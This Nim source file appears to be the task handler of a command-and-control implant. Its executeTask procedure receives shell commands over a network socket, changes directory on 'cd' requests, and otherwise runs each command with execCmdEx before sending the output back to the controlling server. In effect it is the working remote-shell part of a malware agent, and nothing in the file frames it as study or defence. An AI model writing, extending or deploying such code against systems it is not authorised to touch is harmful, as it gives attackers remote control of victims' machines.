import osproc, os, net, strutils, json
import ../client/communication

proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
  let toExec = params[0]
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )
  
  try:
    let cmdSplit = toExec.split(" ")
    if cmdSplit[0] == "cd":
      let newPath = cmdSplit[1..(cmdSplit.len() - 1)].join(" ")
      setCurrentDir(newPath)
      taskOutput.addData(Text, "result", "changed current working directory to " & newPath)
      socket.sendOutput(taskOutput)
      return
    let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
    taskOutput.addData(Text, "result", output)
    socket.sendOutput(taskOutput)
  except OSError:
    taskOutput.error = getCurrentExceptionMsg()
    socket.sendOutput(taskOutput)